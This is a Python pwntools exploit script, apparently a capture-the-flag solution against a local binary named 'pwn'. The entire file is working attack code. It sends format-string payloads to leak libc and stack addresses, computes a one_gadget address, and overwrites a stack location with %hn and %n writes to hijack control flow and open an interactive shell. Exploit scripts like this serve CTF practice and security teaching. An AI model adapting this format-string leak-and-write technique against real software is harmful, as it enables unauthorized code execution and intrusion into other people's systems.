from pwn import *
context(os='linux', arch='amd64', log_level='debug')

io = process('./pwn')

def str_format(content):
       io.recv()
       io.sendline(bytes(str(0x1f4), encoding='utf8'))
       io.recv()
       io.sendline(content)



io.recv()
io.sendline(bytes(str(0x1f4), encoding='utf8'))
io.recv()
payload = b"%11$p:::%13$p%"
io.sendline(payload)
libc_base = int(io.recv(14).ljust(8, b'\x00'), 16) - 0x24083
io.recvuntil(":::")
stack = int(io.recv(14).ljust(8, b'\x00'), 16)
print('libc_base--->', hex(libc_base))
print('stack--->', hex(stack))
target_addr = stack - 0x120
one_gadget = libc_base + 0xe3b01

#28 29
payload = "%{}c%28$hn%3c%29$hn".format(target_addr & 0xffff)
payload = bytes(payload, encoding='utf8')
io.recv()
io.sendline(bytes(str(0x1f4), encoding='utf8'))
io.recv()
io.sendline(payload)

high = (one_gadget >> 24) & 0xffffff
low = (one_gadget & 0xffffff)
payload = "%{}c%41$n%{}c%43$nabcd".format(low, high - low)


#41 43
payload = bytes(payload, encoding='utf8')
io.recv()
io.sendline(bytes(str(0x1f4), encoding='utf8'))
io.recv()
io.sendline(payload)

while True:
       result = str(io.recv())
       if "abcd" in result:
              break



io.interactive()

